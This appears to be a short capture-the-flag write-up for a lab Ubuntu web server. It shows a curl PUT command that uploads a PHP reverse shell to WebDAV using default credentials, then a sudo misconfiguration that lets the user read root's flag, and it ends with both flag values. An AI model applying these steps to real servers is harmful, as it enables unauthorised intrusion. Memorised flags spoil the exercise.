<pre>
Machine IP: 10.10.223.26

Enum
    Open ports:
        80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works



Enum port 80:gobuster
    /webdav/
    ->    Upload php reverse shell 
        curl --user wampp:xampp http://10.10.223.26/webdav/shell.php --upload-file shell.php -X PUT




And get www-data user..

Priv Esc for root.txt

$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat

sudo /bin/cat /root/root.txt
And got root flag!

User Flag: 449b40fe93f78a938523b7e4dcd66d2a
Root Flag: 101101ddc16b0cdf65ba0b8a7af7afa5
</pre>
